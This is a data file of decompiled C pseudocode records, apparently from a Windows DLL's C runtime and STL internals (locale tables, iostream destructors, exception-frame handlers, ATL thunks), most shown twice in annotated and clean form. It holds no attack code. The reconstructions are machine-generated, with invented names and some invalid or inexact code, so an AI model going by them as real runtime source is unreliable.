{"Function Name": "__Getctype", "Address": "1001517f", "Source Code": "\\*\n_Ctypevec * __cdecl __Getctype(_Ctypevec *returnStoragePtr)\n{\n    \n    UINT localeCodePage = ____lc_codepage_func();\n    \n    \n    short *charTypeTable = (short *)FUN_1001df20(0x100, 2);\n    \n    \n    returnStoragePtr->_Page = localeCodePage;\n    \n    \n    returnStoragePtr->_Table = charTypeTable;\n    \n    if (charTypeTable == (short *)0x0) {\n        \n        returnStoragePtr->_Delfl = 0;\n        \n        \n        returnStoragePtr->_Table = (short *)___pctype_func();\n    } else {\n        \n        returnStoragePtr->_Delfl = 1;\n        \n        \n        undefined4 *allocatedCharTypeTable = (undefined4 *)returnStoragePtr->_Table;\n        \n        \n        undefined4 *defaultCharTypeTable = (undefined4 *)___pctype_func();\n        \n        \n        for (int index = 0x80; index != 0; index--) {\n            *allocatedCharTypeTable++ = *defaultCharTypeTable++;\n        }\n    }\n    \n    wchar_t *localeName = ____lc_locale_name_func()[1];\n    \n    \n    returnStoragePtr->_LocaleName = localeName ? __wcsdup(localeName) : (wchar_t *)0x0;\n    \n    \n    return returnStoragePtr;\n}\n*\\ \n \n_Ctypevec * __cdecl __Getctype(_Ctypevec *returnStoragePtr)\n{\n    UINT localeCodePage = ____lc_codepage_func();\n    short *charTypeTable = (short *)FUN_1001df20(0x100, 2);\n    returnStoragePtr->_Page = localeCodePage;\n    returnStoragePtr->_Table = charTypeTable;\n    if (charTypeTable == (short *)0x0) {\n        returnStoragePtr->_Delfl = 0;\n        returnStoragePtr->_Table = (short *)___pctype_func();\n    } else {\n        returnStoragePtr->_Delfl = 1;\n        undefined4 *allocatedCharTypeTable = (undefined4 *)returnStoragePtr->_Table;\n        undefined4 *defaultCharTypeTable = (undefined4 *)___pctype_func();\n        for (int index = 0x80; index != 0; index--) {\n            *allocatedCharTypeTable++ = *defaultCharTypeTable++;\n        }\n    }\n    wchar_t *localeName = ____lc_locale_name_func()[1];\n    returnStoragePtr->_LocaleName = localeName ? __wcsdup(localeName) : (wchar_t *)0x0;\n    return returnStoragePtr;\n}"}
{"Function Name": "__Getcvt", "Address": "100152e5", "Source Code": "\\*\n_Cvtvec * __cdecl __Getcvt(_Cvtvec *returnStoragePtr)\n{\n    wchar_t *localeName; \n    UINT unsignedIntVar; \n    uint indexVar = 0; \n    ushort *charTypeArray; \n    _memset(returnStoragePtr, 0, 0x2c); \n    returnStoragePtr->_Page = ____lc_codepage_func(); \n    returnStoragePtr->_Mbcurmax = ____mb_cur_max_func(); \n    localeName = ____lc_locale_name_func()[2]; \n    returnStoragePtr->_Isclocale = (uint)(localeName == (wchar_t *)0x0); \n    if (localeName != (wchar_t *)0x0) { \n        charTypeArray = ___pctype_func(); \n        do {\n            if ((short)charTypeArray[indexVar] < 0) { \n                returnStoragePtr->_Isleadbyte[indexVar >> 3] |= (byte)(1 << (indexVar & 7)); \n            }\n        } while (++indexVar < 0x100); \n    }\n    return returnStoragePtr; \n}\n*\\ \n \n_Cvtvec * __cdecl __Getcvt(_Cvtvec *returnStoragePtr)\n{\n    wchar_t *localeName;\n    UINT unsignedIntVar;\n    uint indexVar = 0;\n    ushort *charTypeArray;\n    _memset(returnStoragePtr, 0, 0x2c);\n    returnStoragePtr->_Page = ____lc_codepage_func();\n    returnStoragePtr->_Mbcurmax = ____mb_cur_max_func();\n    localeName = ____lc_locale_name_func()[2];\n    returnStoragePtr->_Isclocale = (uint)(localeName == (wchar_t *)0x0);\n    \n    if (localeName != (wchar_t *)0x0) {\n        charTypeArray = ___pctype_func();\n        do {\n            if ((short)charTypeArray[indexVar] < 0) {\n                returnStoragePtr->_Isleadbyte[indexVar >> 3] |= (byte)(1 << (indexVar & 7));\n            }\n        } while (++indexVar < 0x100);\n    }\n    return returnStoragePtr;\n}"}
{"Function Name": "FUN_10015358", "Address": "10015358", "Source Code": "\\*\nundefined4 * __thiscall FUN_10015358(void *object, int error_code)\n{\n    \n    FUN_10001630(object, error_code);\n    \n    \n    *(undefined ***)object = std::length_error::vftable;\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10015358(void *object, int error_code)\n{\n    FUN_10001630(object, error_code);\n    *(undefined ***)object = std::length_error::vftable;\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10015373", "Address": "10015373", "Source Code": "\\*\nundefined4 * __thiscall FUN_10015373(void *object, char *inputString)\n{\n    \n    FUN_100015e0(object, inputString);\n    \n    \n    *(undefined ***)object = std::length_error::vftable;\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10015373(void *object,char *inputString)\n{\n    FUN_100015e0(object,inputString);\n    *(undefined ***)object = std::length_error::vftable;\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10015392", "Address": "10015392", "Source Code": "\\*\nundefined4 * __thiscall FUN_10015392(void *instance, int errorCode)\n{\n    \n    FUN_10001630(instance, errorCode);\n    \n    \n    *(undefined ***)instance = std::logic_error::vftable;\n    \n    \n    return (undefined4 *)instance;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10015392(void *instance,int errorCode)\n{\n    FUN_10001630(instance,errorCode);\n    *(undefined ***)instance = std::logic_error::vftable;\n    return (undefined4 *)instance;\n}"}
{"Function Name": "FUN_100153ad", "Address": "100153ad", "Source Code": "\\*\nundefined4 * __thiscall FUN_100153ad(void *object, int error_code)\n{\n    \n    FUN_10001630(object, error_code);\n    \n    \n    *(undefined ***)object = std::out_of_range::vftable;\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_100153ad(void *object,int error_code)\n{\n    FUN_10001630(object,error_code);\n    *(undefined ***)object = std::out_of_range::vftable;\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_100153c8", "Address": "100153c8", "Source Code": "\\*\nundefined4 * __thiscall FUN_100153c8(void *object, char *inputString)\n{\n    \n    FUN_100015e0(object, inputString);\n    \n    \n    *(undefined ***)object = std::out_of_range::vftable;\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_100153c8(void *object,char *inputString)\n{\n    FUN_100015e0(object,inputString);\n    *(undefined ***)object = std::out_of_range::vftable;\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_100156ce", "Address": "100156ce", "Source Code": "\\*\nvoid __thiscall\nFUN_100156ce(void *this, basic_streambuf<char, struct_std::char_traits<char>_> *param_1, bool param_2, int param_3)\n{\n    \n    if (param_3 != 0) {\n        \n        *(undefined ***)this = &PTR_1003b0a0;\n        \n        *(undefined ***)((int)this + 8) = std::basic_ios<char, struct_std::char_traits<char>_>::vftable;\n    }\n    \n    *(undefined ***)((int)this + *(int *)(*this + 4)) =\n    std::basic_ostream<char, struct_std::char_traits<char>_>::vftable;\n    \n    *(int *)(*(int *)(*this + 4) + -4 + (int)this) = *(int *)(*this + 4) + -8;\n    \n    std::basic_ios<char, struct_std::char_traits<char>_>::init\n    ((basic_ios<char, struct_std::char_traits<char>_> *)(*(int *)(*this + 4) + (int)this),\n    param_1, param_2);\n    \n    \n    FUN_10036ff7();\n    \n    \n    return;\n}\n*\\ \n \nvoid __thiscall\nFUN_100156ce(void *this, basic_streambuf<char, struct_std::char_traits<char>_> *param_1, bool param_2, int param_3)\n{\n    if (param_3 != 0) {\n        *(undefined ***)this = &PTR_1003b0a0;\n        *(undefined ***)((int)this + 8) = std::basic_ios<char, struct_std::char_traits<char>_>::vftable;\n    }\n    *(undefined ***)((int)this + *(int *)(*this + 4)) =\n    std::basic_ostream<char, struct_std::char_traits<char>_>::vftable;\n    *(int *)(*(int *)(*this + 4) + -4 + (int)this) = *(int *)(*this + 4) + -8;\n    std::basic_ios<char, struct_std::char_traits<char>_>::init\n    ((basic_ios<char, struct_std::char_traits<char>_> *)(*(int *)(*this + 4) + (int)this),\n    param_1, param_2);\n    FUN_10036ff7();\n    return;\n}"}
{"Function Name": "~basic_ios<>", "Address": "10015855", "Source Code": "\\*\nvoid __fastcall ~basic_ios<>(undefined4 *vftable_pointer) \n{\n    void *current_exception_list = exception_list; \n    exception_list = &current_exception_list; \n    *vftable_pointer = std::ios_base::vftable; \n    std::ios_base::_Ios_base_dtor((ios_base *)vftable_pointer); \n    exception_list = current_exception_list; \n    return; \n}\n*\\ \n \nvoid __fastcall ~basic_ios<>(undefined4 *vftable_pointer)\n{\n    void *current_exception_list = exception_list;\n    exception_list = &current_exception_list;\n    *vftable_pointer = std::ios_base::vftable;\n    std::ios_base::_Ios_base_dtor((ios_base *)vftable_pointer);\n    exception_list = current_exception_list;\n    return;\n}"}
{"Function Name": "FID_conflict:`vbase_destructor'", "Address": "100158b6", "Source Code": "void __fastcall FID_conflict__vbase_destructor_(int *input_array)\n{\n    int *third_integer_pointer; \n    third_integer_pointer = input_array + 2; \n    *(undefined ***)(*(int *)(*input_array + 4) + -8 + (int)third_integer_pointer) =\n        std::basic_ostream<char,struct_std::char_traits<char>_>::vftable; \n    *(int *)(*(int *)(*input_array + 4) + -0xc + (int)third_integer_pointer) = *(int *)(*input_array + 4) + -8; \n    *third_integer_pointer = (int)std::ios_base::vftable; \n    std::ios_base::_Ios_base_dtor((ios_base *)third_integer_pointer); \n    return; \n}"}
{"Function Name": "FID_conflict:`scalar_deleting_destructor'", "Address": "1001591c", "Source Code": "\\*\nbasic_filebuf<char,struct_std::char_traits<char>_> * __thiscall\nFID_conflict__scalar_deleting_destructor_(void *this, byte param_1)\n{\n    \n    std::basic_filebuf<char,struct_std::char_traits<char>_>::~basic_filebuf<char,struct_std::char_traits<char>_>((basic_filebuf<char,struct_std::char_traits<char>_> *)this);\n    \n    \n    if (param_1 & 1) {\n        \n        FUN_10013ceb(this);\n    }\n    \n    \n    return (basic_filebuf<char,struct_std::char_traits<char>_> *)this;\n}\n*\\ \n \nbasic_filebuf<char,struct_std::char_traits<char>_> * __thiscall\nFID_conflict__scalar_deleting_destructor_(void *this, byte param_1)\n{\n    std::basic_filebuf<char,struct_std::char_traits<char>_>::~basic_filebuf<char,struct_std::char_traits<char>_>((basic_filebuf<char,struct_std::char_traits<char>_> *)this);\n    if (param_1 & 1) {\n        FUN_10013ceb(this);\n    }\n    return (basic_filebuf<char,struct_std::char_traits<char>_> *)this;\n}"}
{"Function Name": "FID_conflict:`scalar_deleting_destructor'", "Address": "1001593e", "Source Code": "\\*\nundefined4 * __thiscall FID_conflict__scalar_deleting_destructor_(void *object_pointer, byte flags)\n{\n    void *current_exception_list_pointer = exception_list; \n    exception_list = &current_exception_list_pointer; \n    *(undefined ***)object_pointer = std::ios_base::vftable; \n    std::ios_base::_Ios_base_dtor((ios_base *)object_pointer); \n    if ((flags & 1) != 0) { \n        FUN_10013ceb(object_pointer); \n    }\n    exception_list = current_exception_list_pointer; \n    return (undefined4 *)object_pointer; \n}\n*\\ \n \nundefined4 * __thiscall FID_conflict__scalar_deleting_destructor_(void *object_pointer, byte flags)\n{\n    void *current_exception_list_pointer = exception_list;\n    exception_list = &current_exception_list_pointer;\n    *(undefined ***)object_pointer = std::ios_base::vftable;\n    std::ios_base::_Ios_base_dtor((ios_base *)object_pointer);\n    if ((flags & 1) != 0) {\n        FUN_10013ceb(object_pointer);\n    }\n    exception_list = current_exception_list_pointer;\n    return (undefined4 *)object_pointer;\n}"}
{"Function Name": "FID_conflict:`scalar_deleting_destructor'", "Address": "10015996", "Source Code": "int * __thiscall FID_conflict__scalar_deleting_destructor_(void *object_pointer, byte flag)\n{\n    \n    int *object_address = (int *)((int)object_pointer - 8);\n    \n    \n    FID_conflict__vbase_destructor_(object_address);\n    \n    \n    if (flag & 1) {\n        \n        FUN_10013ceb(object_address);\n    }\n    \n    \n    return object_address;\n}"}
{"Function Name": "FUN_100159bb", "Address": "100159bb", "Source Code": "\\*\nundefined4 * method FUN_100159bb(void *this, byte flag)\n{\n    \n    ~basic_streambuf<>((undefined4 *)this);\n    \n    \n    if (flag & 1) {\n        \n        FUN_10013ceb(this);\n    }\n    \n    \n    return (undefined4 *)this;\n}\n*\\ \n \nundefined4 * method FUN_100159bb(void *this, byte flag)\n{\n    ~basic_streambuf<>((undefined4 *)this);\n    if (flag & 1) {\n        FUN_10013ceb(this);\n    }\n    return (undefined4 *)this;\n}"}
{"Function Name": "Initcvt", "Address": "10015c96", "Source Code": "void __thiscall Initcvt(void *instance, codecvt_base *codecvt_param)\n{\n    \n    if (std::codecvt_base::always_noconv(codecvt_param)) {\n        \n        *(undefined4 *)((int)instance + 0x38) = 0;\n    } else {\n        \n        *(codecvt_base **)((int)instance + 0x38) = codecvt_param;\n        \n        std::basic_streambuf<char, struct std::char_traits<char>>:: _Init((basic_streambuf<char, struct std::char_traits<char> > *)instance);\n    }\n}"}
{"Function Name": "FUN_10015db4", "Address": "10015db4", "Source Code": "undefined4 FUN_10015db4(undefined4 input_value, undefined4 input_value_2, undefined4 *output_pointer_1, undefined4 *output_pointer_2) {\n    \n    *output_pointer_1 = input_value;\n    \n    \n    *output_pointer_2 = input_value_2;\n    \n    \n    return 3;\n}"}
{"Function Name": "FUN_10015dce", "Address": "10015dce", "Source Code": "uint FUN_10015dce(undefined4 inputValue1, int startValue, int endValue, uint comparisonValue)\n{\n    \n    uint difference = endValue - startValue;\n    \n    \n    return (comparisonValue <= difference) ? comparisonValue : difference;\n}"}
{"Function Name": "FUN_10015de3", "Address": "10015de3", "Source Code": "undefined4\nFUN_10015de3(undefined4 input_value, undefined4 *output_pointer)\n{\n    \n    *output_pointer = input_value;\n    \n    \n    return 0;\n}"}
{"Function Name": "imbue", "Address": "10015e3f", "Source Code": "void __thiscall imbue(void *context, locale *locale_param)\n{\n    \n    Initcvt(context, (codecvt_base *)std::use_facet<class_std::codecvt<char,char,struct__Mbstatet>_>(locale_param));\n}"}
{"Function Name": "seekoff", "Address": "10016126", "Source Code": "void seekoff(undefined4 *array)\n{\n    \n    array[0] = 0xffffffff;\n    \n    \n    array[1] = 0xffffffff;\n    \n    \n    array[2] = 0;\n    \n    \n    array[3] = 0;\n    \n    \n    array[4] = 0;\n    \n    \n    array[5] = 0;\n}"}
{"Function Name": "seekpos", "Address": "100161ca", "Source Code": "void seekpos(undefined4 *array)\n{\n    \n    array[0] = 0xffffffff;\n    \n    \n    array[1] = 0xffffffff;\n    \n    \n    array[2] = 0;\n    \n    \n    array[3] = 0;\n    \n    \n    array[4] = 0;\n    \n    \n    array[5] = 0;\n}"}
{"Function Name": "___uncaught_exception", "Address": "100167ee", "Source Code": "bool is_uncaught_exception(void)\n{\n    \n    uint thread_data_pointer = ___vcrt_getptd_noinit();\n    \n    \n    return thread_data_pointer != 0 && 0 < *(int *)(thread_data_pointer + 0x18);\n}"}
{"Function Name": "_Atexit", "Address": "100168af", "Source Code": "void __cdecl _Atexit(_func_void *function_pointer)\n{\n    \n    if (exit_counter != 0) {\n        \n        exit_counter--;\n        \n        *(PVOID *)(exit_counter * 4 + 0x1004fb50) = EncodePointer(function_pointer);\n        return; \n    }\n    \n    if (get_sigabrt_handler() != 0) {\n        \n        raise_signal(0x16);\n    }\n    \n    if ((feature_flags & 2) != 0 && is_feature_present(0x17)) {\n        \n        ((code *)system_interrupt(0x29))();\n    }\n    \n    report_fault(3, 0x40000015, 1);\n    exit_program(3); \n}"}
{"Function Name": "__freea_crt", "Address": "10016ab2", "Source Code": "void __cdecl __freea_crt(int pointerAddress)\n{\n    \n    if (pointerAddress != 0 && *(int *)(pointerAddress - 8) == 0xdddd) {\n        \n        freeFunction((int *)(pointerAddress - 8));\n    }\n}"}
{"Function Name": "___crtInitOnceExecuteOnce", "Address": "10016f81", "Source Code": "uint __cdecl\n___crtInitOnceExecuteOnce(int *param_1, undefined *param_2, undefined4 param_3, undefined4 param_4)\n{\n    uint uVar2; \n    int iVar3; \n    code *pcVar4; \n    pcVar4 = (code *)(DAT_1004fbc4 ^ DAT_1004e008); \n    if (pcVar4 == (code *)0x0) { \n        LOCK(); \n        iVar3 = *param_1; \n        if (iVar3 == 0) { \n            *param_1 = 1; \n            iVar3 = 0; \n        }\n        UNLOCK(); \n        while (iVar3 != 2) { \n            if (iVar3 == 0) { \n                (*(code *)PTR__guard_check_icall_1003a2f8)(param_1, param_3, param_4); \n                iVar3 = (*(code *)param_2)(); \n                if (iVar3 == 0) { \n                    *param_1 = 0; \n                } else {\n                    *param_1 = 2; \n                }\n                LOCK(); \n                if (*param_1 == 1) { \n                    UNLOCK(); \n                    return (uint)(iVar3 != 0); \n                }\n                UNLOCK(); \n            } else if (iVar3 == 1) { \n                SwitchToThread(); \n                LOCK(); \n                iVar3 = *param_1; \n                if (iVar3 == 0) { \n                    *param_1 = 1; \n                    iVar3 = 0; \n                }\n                UNLOCK(); \n            }\n        }\n    } else {\n        (*(code *)PTR__guard_check_icall_1003a2f8)(param_1, param_2, param_3, param_4); \n        uVar2 = (*pcVar4)(); \n    }\n    return uVar2; \n}"}
{"Function Name": "___crtInitializeCriticalSectionEx", "Address": "1001700f", "Source Code": "undefined4 __cdecl\n___crtInitializeCriticalSectionEx(LPCRITICAL_SECTION param_1,DWORD param_2,undefined4 param_3)\n{\n    \n    code *pcVar2 = (code *)(DAT_1004fbc0 ^ DAT_1004e008);\n    \n    \n    if (pcVar2 == (code *)0x0) {\n        \n        InitializeCriticalSectionAndSpinCount(param_1,param_2);\n        return 1; \n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(param_1,param_2,param_3);\n        \n        return (*pcVar2)();\n    }\n}"}
{"Function Name": "_GetTableIndexFromLocaleName", "Address": "10017048", "Source Code": "undefined4 __cdecl _GetTableIndexFromLocaleName(int locale_name)\n{\n    int middle_index; \n    int lower_bound = 0; \n    int upper_bound = 0xe3; \n    do {\n        middle_index = (upper_bound + lower_bound) / 2; \n        \n        if (___wcsnicmp_ascii(locale_name, *(ushort **)(&UNK_1003bc90 + middle_index * 8), 0x55) == 0) {\n            return *(undefined4 *)(&UNK_1003bc94 + middle_index * 8); \n        }\n        \n        if (___wcsnicmp_ascii(locale_name, *(ushort **)(&UNK_1003bc90 + middle_index * 8), 0x55) < 0) {\n            upper_bound = middle_index - 1; \n        } else {\n            lower_bound = middle_index + 1; \n        }\n    } while (lower_bound <= upper_bound); \n    \n    return 0xffffffff; \n}"}
{"Function Name": "___crtLCMapStringEx", "Address": "100170c0", "Source Code": "int __cdecl\n___crtLCMapStringEx(LPCWSTR lpLocaleName, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc,\n                    LPWSTR lpDestStr, int cchDest)\n{\n    LCID Locale;  \n    code *pcVar2 = (code *)(DAT_1004fc4c ^ DAT_1004e008);  \n    if (pcVar2 == (code *)0x0) {  \n        Locale = ___crtDownlevelLocaleNameToLCID((int)lpLocaleName);  \n        return LCMapStringW(Locale, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest);  \n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(lpLocaleName, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest, 0, 0, 0);\n        return (*pcVar2)();  \n    }\n}"}
{"Function Name": "___wcsnicmp_ascii", "Address": "10017117", "Source Code": "int __cdecl ___wcsnicmp_ascii(int string_offset, ushort *second_string, int char_count)\n{\n    ushort current_char; \n    int comparison_result = 0; \n    if (char_count != 0) { \n        comparison_result = string_offset - (int)second_string; \n        do {\n            current_char = *(ushort *)(comparison_result + (int)second_string); \n            if ((ushort)(current_char - 0x41) < 0x1a) { \n                current_char += 0x20; \n            }\n            ushort second_char = *second_string; \n            if ((ushort)(second_char - 0x41) < 0x1a) { \n                second_char += 0x20; \n            }\n            second_string++; \n            char_count--; \n        } while ((char_count != 0) && (current_char != 0) && (current_char == second_char)); \n        comparison_result = (uint)current_char - (uint)second_char; \n    }\n    return comparison_result; \n}"}
{"Function Name": "__AllocStdCallThunk_cmn", "Address": "10017334", "Source Code": "void * __cdecl __AllocStdCallThunk_cmn(void)\n{\n    HANDLE heapHandle; \n    LPVOID allocatedMemoryPtr; \n    PSINGLE_LIST_ENTRY singleListEntryPtr; \n    PSINGLE_LIST_ENTRY anotherSingleListEntryPtr; \n    \n    if ((DAT_1004fd00 != (PSLIST_HEADER)0x0) || (__InitializeThunkPool() != 0)) {\n        \n        if (DAT_1004fd00 == (PSLIST_HEADER)0x1) {\n            allocatedMemoryPtr = HeapAlloc(GetProcessHeap(), 8, 0xd); \n            if (allocatedMemoryPtr != (LPVOID)0x0) {\n                return allocatedMemoryPtr; \n            }\n        } else {\n            \n            singleListEntryPtr = InterlockedPopEntrySList(DAT_1004fd00);\n            if (singleListEntryPtr != (PSINGLE_LIST_ENTRY)0x0) {\n                _memset(singleListEntryPtr, 0, 0xd); \n                return singleListEntryPtr; \n            }\n            \n            singleListEntryPtr = (PSINGLE_LIST_ENTRY)VirtualAlloc((LPVOID)0x0, 0x1000, 0x1000, 0x40);\n            if (singleListEntryPtr != (PSINGLE_LIST_ENTRY)0x0) {\n                \n                anotherSingleListEntryPtr = InterlockedPopEntrySList(DAT_1004fd00);\n                if (anotherSingleListEntryPtr != (PSINGLE_LIST_ENTRY)0x0) {\n                    VirtualFree(singleListEntryPtr, 0, 0x8000); \n                    return anotherSingleListEntryPtr; \n                }\n                anotherSingleListEntryPtr = singleListEntryPtr + 0x3fc; \n                do {\n                    InterlockedPushEntrySList(DAT_1004fd00, singleListEntryPtr); \n                    singleListEntryPtr = singleListEntryPtr + 4; \n                } while (singleListEntryPtr < anotherSingleListEntryPtr); \n                return singleListEntryPtr; \n            }\n        }\n    }\n    \n    RaiseException(0xc0000017, 0, 0, (ULONG_PTR *)0x0);\n    return (void *)0x0; \n}"}
{"Function Name": "__FreeStdCallThunk_cmn", "Address": "100173fa", "Source Code": "void __cdecl __FreeStdCallThunk_cmn(void *input_param)\n{\n    \n    if (input_param != (void *)0x0) {\n        \n        if (global_list_head == (PSLIST_HEADER)0x1) {\n            \n            memory_free_function(get_process_heap_function(), 0, input_param);\n            return; \n        }\n        \n        push_entry_to_list_function(global_list_head, (PSINGLE_LIST_ENTRY)input_param);\n    }\n}"}
{"Function Name": "_AtlThunk_DataToCode@4", "Address": "100174fa", "Source Code": "AtlThunkData_t * _AtlThunk_DataToCode_4(int *input_params)\n{\n    _func_AtlThunkData_t_ptr *function_pointer; \n    AtlThunkData_t *thunk_data; \n    \n    if ((input_params == (int *)0x0) || ((AtlThunkData_t *)input_params[1] == (AtlThunkData_t *)0x0)) {\n        return (AtlThunkData_t *)0x0; \n    }\n    thunk_data = (AtlThunkData_t *)input_params[1]; \n    \n    if ((*input_params == 0) &&\n        (function_pointer = GetProcAddressAll<struct_AtlThunkData_t*_(__stdcall*)(void)>\n        ((_func_AtlThunkData_t_ptr **)&DAT_1004fd0c), \n        function_pointer != (_func_AtlThunkData_t_ptr *)0x0)) {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(input_params[1]);\n        return (*function_pointer)(); \n    }\n    return thunk_data; \n}"}
{"Function Name": "_AtlThunk_FreeData@4", "Address": "10017541", "Source Code": "void _AtlThunk_FreeData_4(int *inputArray)\n{\n    \n    if (inputArray != (int *)0x0) {\n        \n        if (inputArray[1] != 0) {\n            \n            if (*inputArray == 0) {\n                \n                _func_AtlThunkData_t_ptr *functionPointer = GetProcAddressAll<struct_AtlThunkData_t*_(__stdcall*)(void)>((_func_AtlThunkData_t_ptr **)&DAT_1004fd10);\n                \n                if (functionPointer != (_func_AtlThunkData_t_ptr *)0x0) {\n                    \n                    (*(code *)PTR__guard_check_icall_1003a2f8)(inputArray[1]);\n                    \n                    (*functionPointer)();\n                }\n            } else {\n                \n                __FreeStdCallThunk_cmn((void *)inputArray[1]);\n            }\n        }\n        \n        HeapFree(GetProcessHeap(), 0, inputArray);\n    }\n    \n    return;\n}"}
{"Function Name": "_AtlThunk_InitData@12", "Address": "10017597", "Source Code": "void _AtlThunk_InitData_12(int *inputArray, ulong value, void *context)\n{\n    _func_AtlThunkData_t_ptr *functionPointer; \n    \n    if (inputArray != (int *)0x0 && (_stdcallthunk *)inputArray[1] != (_stdcallthunk *)0x0) {\n        \n        if (*inputArray == 0) {\n            \n            functionPointer = GetProcAddressAll<struct_AtlThunkData_t*_(__stdcall*)(void)>((_func_AtlThunkData_t_ptr **)&DAT_1004fd08);\n            \n            if (functionPointer != (_func_AtlThunkData_t_ptr *)0x0) {\n                \n                (*(code *)PTR__guard_check_icall_1003a2f8)(inputArray[1], value, context);\n                \n                (*functionPointer)();\n            }\n        } else {\n            \n            ATL::_stdcallthunk::Init((_stdcallthunk *)inputArray[1], value, context);\n        }\n    }\n}"}
{"Function Name": "_UnwindNestedFrames", "Address": "10017c00", "Source Code": "void _UnwindNestedFrames(EHRegistrationNode *eh_registration_node, EHExceptionRecord *eh_exception_record)\n{\n    \n    RtlUnwind(eh_registration_node, (PVOID)0x10017c2a, (PEXCEPTION_RECORD)eh_exception_record, (PVOID)0x0);\n    \n    \n    *(uint *)(eh_exception_record + 4) &= 0xfffffffd;\n    \n    \n    *(void **)exception_list = exception_list;\n    \n    \n    exception_list = exception_list;\n}"}
{"Function Name": "__CatchGuardHandler", "Address": "10017c53", "Source Code": "void __cdecl\n__CatchGuardHandler(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3)\n{\n    \n    ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);\n    \n    \n    __InternalCxxFrameHandler<class___FrameHandler3>(\n        param_1,                             \n        *(EHRegistrationNode **)(param_2 + 0x10), \n        param_3,                             \n        (void *)0x0,                        \n        *(_s_FuncInfo **)(param_2 + 0xc),  \n        *(int *)(param_2 + 0x14),          \n        param_2,                            \n        '\\0'                                \n    );\n}"}
{"Function Name": "__CreateFrameInfo", "Address": "10017c84", "Source Code": "\\*\nundefined4 * __cdecl __CreateFrameInfo(undefined4 *frame_info, undefined4 value)\n{\n    *frame_info = value; \n    frame_info[1] = *(undefined4 *)(___vcrt_getptd() + 0x24); \n    *(undefined4 **)(___vcrt_getptd() + 0x24) = frame_info; \n    return frame_info; \n}\n*\\ \n \nundefined4 * __cdecl __CreateFrameInfo(undefined4 *frame_info, undefined4 value)\n{\n    *frame_info = value;\n    frame_info[1] = *(undefined4 *)(___vcrt_getptd() + 0x24);\n    *(undefined4 **)(___vcrt_getptd() + 0x24) = frame_info;\n    return frame_info;\n}"}
{"Function Name": "__FindAndUnlinkFrame", "Address": "10017ca8", "Source Code": "void __cdecl __FindAndUnlinkFrame(int target_frame)\n{\n    int current_frame; \n    int *next_frame_pointer; \n    current_frame = *(int *)(___vcrt_getptd() + 0x24); \n    if (target_frame == current_frame) { \n        *(undefined4 *)(___vcrt_getptd() + 0x24) = *(undefined4 *)(target_frame + 4); \n        return; \n    }\n    do {\n        next_frame_pointer = (int *)(current_frame + 4); \n        current_frame = *next_frame_pointer; \n        if (current_frame == 0) { \n            _terminate(); \n            ((code *)swi(3))(); \n            return; \n        }\n    } while (target_frame != current_frame); \n    *next_frame_pointer = *(int *)(target_frame + 4); \n    return; \n}"}
{"Function Name": "__TranslatorGuardHandler", "Address": "10017ced", "Source Code": "undefined4 __cdecl\n__TranslatorGuardHandler(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3)\n{\n    \n    ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);\n    \n    \n    if ((*(uint *)(param_1 + 4) & 0x66) != 0) {\n        \n        *(undefined4 *)(param_2 + 0x24) = 1;\n        return 1; \n    }\n    \n    \n    __InternalCxxFrameHandler<class___FrameHandler3>\n    (param_1, *(EHRegistrationNode **)(param_2 + 0x10), param_3, (void *)0x0,\n    *(_s_FuncInfo **)(param_2 + 0xc), *(int *)(param_2 + 0x14),\n    *(EHRegistrationNode **)(param_2 + 0x18), '\\x01');\n    \n    \n    if (*(int *)(param_2 + 0x24) == 0) {\n        _UnwindNestedFrames(param_2, param_1);\n    }\n    \n    \n    return _CallSETranslator((EHExceptionRecord *)0x123, (EHRegistrationNode *)0x0, (void *)0x0,\n    (void *)0x0, (_s_FuncInfo *)0x0, 0, (EHRegistrationNode *)0x0)();\n}"}
{"Function Name": "FID_conflict:___CxxFrameHandler3", "Address": "10017d8a", "Source Code": "_EXCEPTION_DISPOSITION __cdecl\nFID_conflict____CxxFrameHandler3\n(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3, void *param_4)\n{\n    \n    return __InternalCxxFrameHandler<class___FrameHandler3>\n    (param_1, param_2, param_3, param_4, 0, (EHRegistrationNode *)0x0, '\\0');\n}"}
{"Function Name": "___DestructExceptionObject", "Address": "10017dc0", "Source Code": "void __cdecl ___DestructExceptionObject(int *exceptionObject)\n{\n    byte *bytePointer; \n    code *functionPointer; \n    \n    if ((((exceptionObject != (int *)0x0) && (*exceptionObject == -0x1f928c9d)) && (exceptionObject[4] == 3)) &&\n        (((exceptionObject[5] == 0x19930520 || (exceptionObject[5] == 0x19930521)) || (exceptionObject[5] == 0x19930522)) &&\n        (bytePointer = (byte *)exceptionObject[7], bytePointer != (byte *)0x0)))) {\n        \n        \n        if (*(void **)(bytePointer + 4) == (void *)0x0) {\n            \n            if (((*bytePointer & 0x10) != 0) && (*(int **)exceptionObject[6] != (int *)0x0)) {\n                functionPointer = *(code **)(*(int **)exceptionObject[6] + 8); \n                (*(code *)PTR__guard_check_icall_1003a2f8)(*(int **)exceptionObject[6]); \n                (*functionPointer)(); \n            }\n        } else {\n            \n            _CallMemberFunction0((void *)exceptionObject[6], *(void **)(bytePointer + 4));\n        }\n    }\n    return; \n}"}
